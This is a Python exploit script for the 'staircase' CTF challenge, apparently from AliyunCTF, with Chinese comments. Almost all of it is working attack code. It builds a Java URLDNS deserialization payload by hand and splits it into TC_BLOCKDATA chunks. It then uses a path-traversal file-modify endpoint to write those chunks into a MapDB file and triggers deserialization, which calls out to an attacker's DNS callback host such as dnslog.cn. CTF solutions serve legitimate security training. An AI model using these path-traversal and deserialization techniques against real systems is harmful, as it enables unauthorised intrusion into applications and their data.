#!/usr/bin/env python3
"""
CTF Challenge: staircase - AliyunCTF
Final Working Exploit

漏洞利用：
1. 路径穿越修改 MapDB 文件
2. 使用 TC_BLOCKDATA 链技术跳过 <start>/<end> 标签
3. 构建完整的 URLDNS payload 触发反序列化

每次写入: <start>(7) + DATA(8) + <end>(5) = 20 bytes
使用 77 0C (TC_BLOCKDATA 12) 跳过 <end><start> = 12 bytes
"""

import requests
import base64
import struct
import sys
import time


def create_urldns_payload(callback_url):
    """创建 URLDNS payload - 在反序列化时触发 DNS 查询"""
    payload = bytearray()
    
    # Stream header
    payload += b'\xac\xed\x00\x05'
    
    # TC_OBJECT + TC_CLASSDESC for java.util.HashMap
    payload += b'\x73\x72'
    payload += struct.pack('>H', 17)
    payload += b'java.util.HashMap'
    payload += struct.pack('>q', 362498820763181265)  # serialVersionUID
    payload += b'\x03'  # flags
    payload += struct.pack('>H', 2)  # field count
    
    payload += b'F' + struct.pack('>H', 10) + b'loadFactor'
    payload += b'I' + struct.pack('>H', 9) + b'threshold'
    payload += b'\x78\x70'  # ENDBLOCKDATA + NULL
    
    payload += struct.pack('>f', 0.75) + struct.pack('>i', 0)
    payload += struct.pack('>i', 16) + struct.pack('>i', 1)
    
    # URL object
    payload += b'\x73\x72'
    payload += struct.pack('>H', 12)
    payload += b'java.net.URL'
    payload += struct.pack('>q', -7627629684871044846)  # serialVersionUID
    payload += b'\x03'
    payload += struct.pack('>H', 7)
    
    payload += b'I' + struct.pack('>H', 8) + b'hashCode'
    payload += b'I' + struct.pack('>H', 4) + b'port'
    
    for name, sig in [(b'authority', b'Ljava/lang/String;'),
                      (b'file', b'Ljava/lang/String;'),
                      (b'host', b'Ljava/lang/String;'),
                      (b'protocol', b'Ljava/lang/String;'),
                      (b'ref', b'Ljava/lang/String;')]:
        payload += b'L' + struct.pack('>H', len(name)) + name
        payload += b'\x74' + struct.pack('>H', len(sig)) + sig
    
    payload += b'\x78\x70'
    payload += struct.pack('>ii', -1, -1)
    
    host = callback_url.replace('http://', '').replace('https://', '').split('/')[0]
    for s in [host, '/', host, 'http', None]:
        if s:
            payload += b'\x74' + struct.pack('>H', len(s)) + s.encode()
        else:
            payload += b'\x70'
    
    payload += b'\x78\x71' + struct.pack('>i', 0x7e0003) + b'\x78'
    
    return bytes(payload)


def build_blockdata_chunks(raw_payload):
    """
    将 payload 转换为 blockdata chain 格式
    
    Layout:
    Chunk 0: ACED 0005 77 0C XX XX (stream header + blockdata 12 + 2 filler)
    Chunk 1: [6 bytes] 77 0C (payload + blockdata 12)
    Chunk 2: [6 bytes] 77 0C
    ...
    Chunk N: [6 bytes] 00 00 (last chunk, no more blockdata)
    """
    chunks = []
    
    # 第一块: stream header + blockdata 指令
    first_chunk = b'\xac\xed\x00\x05\x77\x0c\x00\x00'
    chunks.append(first_chunk)
    
    # 后续块包含实际 payload (从 raw_payload[4:] 开始)
    remaining = raw_payload[4:]
    
    i = 0
    while i < len(remaining):
        chunk_data = remaining[i:i+6]
        if len(chunk_data) < 6:
            chunk_data = chunk_data + b'\x00' * (6 - len(chunk_data))
        
        if i + 6 < len(remaining):
            chunk = chunk_data + b'\x77\x0c'
        else:
            chunk = chunk_data + b'\x00\x00'
        
        chunks.append(chunk)
        i += 6
    
    return chunks


class StaircaseExploit:
    def __init__(self, url):
        self.url = url.rstrip('/')
        self.session = requests.Session()
    
    def upload(self, content, filename="test.bin"):
        files = {'file': (filename, content, 'application/octet-stream')}
        return self.session.post(f"{self.url}/files/upload", files=files, timeout=10)
    
    def modify(self, path, data, offset):
        payload = {
            "fileName": path,
            "data": base64.b64encode(data).decode(),
            "offset": offset
        }
        return self.session.put(f"{self.url}/files/modify", json=payload, timeout=10)
    
    def get_icon(self):
        try:
            return self.session.get(f"{self.url}/files/icon", timeout=30)
        except:
            return None
    
    def exploit(self, mapdb_path, callback_url, target_offset=0x100250):
        print("=" * 60)
        print(" Staircase CTF Exploit")
        print("=" * 60)
        print(f"Target URL: {self.url}")
        print(f"MapDB Path: {mapdb_path}")
        print(f"Callback:   {callback_url}")
        print(f"Offset:     0x{target_offset:x}")
        print()
        
        print("[1] Uploading file to initialize MapDB...")
        resp = self.upload(b"X" * 100)
        if not resp or resp.status_code != 200:
            print("[-] Upload failed")
            return False
        print("[+] Upload OK")
        
        print("[2] Building URLDNS payload...")
        raw_payload = create_urldns_payload(callback_url)
        print(f"    Raw payload size: {len(raw_payload)} bytes")
        
        chunks = build_blockdata_chunks(raw_payload)
        print(f"    Chunks: {len(chunks)}")
        
        print("[3] Writing payload chunks...")
        write_base = target_offset - 7
        
        for idx, chunk in enumerate(chunks):
            offset = write_base + idx * 20
            
            resp = self.modify(mapdb_path, chunk, offset)
            if not resp or resp.status_code != 200:
                print(f"[-] Chunk {idx} failed at offset 0x{offset:x}")
                if resp:
                    print(f"    Error: {resp.text}")
                return False
            
            if idx < 3 or idx >= len(chunks) - 2:
                print(f"    Chunk {idx}: offset=0x{offset:x}, data={chunk.hex()}")
            elif idx == 3:
                print(f"    ... ({len(chunks) - 4} more chunks) ...")
        
        print(f"[+] All {len(chunks)} chunks written successfully")
        
        print("[4] Triggering deserialization...")
        print("    Check your DNS/HTTP callback server!")
        
        resp = self.get_icon()
        if resp:
            print(f"    Response: {resp.status_code}")
            if resp.status_code != 200:
                print(f"    Error body: {resp.text[:200]}")
        else:
            print("    No response (timeout or error)")
        
        print()
        print("[*] If you see a DNS query to your callback, exploitation succeeded!")
        
        return True


def main():
    if len(sys.argv) < 4:
        print(f"""
Staircase CTF Exploit - URLDNS via TC_BLOCKDATA Chain

Usage: python {sys.argv[0]} <target_url> <mapdb_path> <callback_url>

Arguments:
    target_url   : Target application URL (e.g., http://localhost:8080)
    mapdb_path   : Path traversal to MapDB file (e.g., ../../../tmp/mapdb123temp)
    callback_url : Your DNS callback URL (e.g., http://xxx.dnslog.cn)

Example:
    python {sys.argv[0]} http://localhost:8080 ../../../tmp/mapdb123temp http://abc.dnslog.cn

To find MapDB file:
    docker exec <container> ls /tmp/mapdb*
        """)
        sys.exit(1)
    
    target = sys.argv[1]
    mapdb = sys.argv[2]
    callback = sys.argv[3]
    
    exp = StaircaseExploit(target)
    exp.exploit(mapdb, callback)


if __name__ == "__main__":
    main()
